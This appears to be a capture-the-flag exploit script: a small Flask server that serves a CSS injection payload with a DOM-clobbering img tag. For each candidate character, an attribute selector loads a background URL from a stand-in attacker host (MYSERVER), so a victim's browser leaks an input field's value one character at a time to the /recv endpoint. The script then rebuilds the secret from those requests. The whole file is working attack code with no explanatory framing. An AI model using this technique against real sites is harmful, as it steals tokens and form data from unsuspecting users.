from flask import Flask, request


app = Flask(__name__)

alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
FLAG = ""

@app.after_request
def after(response):
    response.headers["Access-Control-Allow-Origin"] = "*"
    return response

@app.get("/payload")
def index():
    data = """<img name=querySelectorAll>\n<style>"""

    for x in alphabet:
        data += f"""
    input[value^="{FLAG}{x}"]{{
        background: url(http://MYSERVER/recv?char={x})
    }}
    """
    
    return data + "</style>"
    
@app.get("/recv")
def recv():
    global FLAG
    FLAG += request.args.get("char")
    print(FLAG, flush=True)

    return ""

if __name__ == "__main__":
    app.run("0.0.0.0", 1337)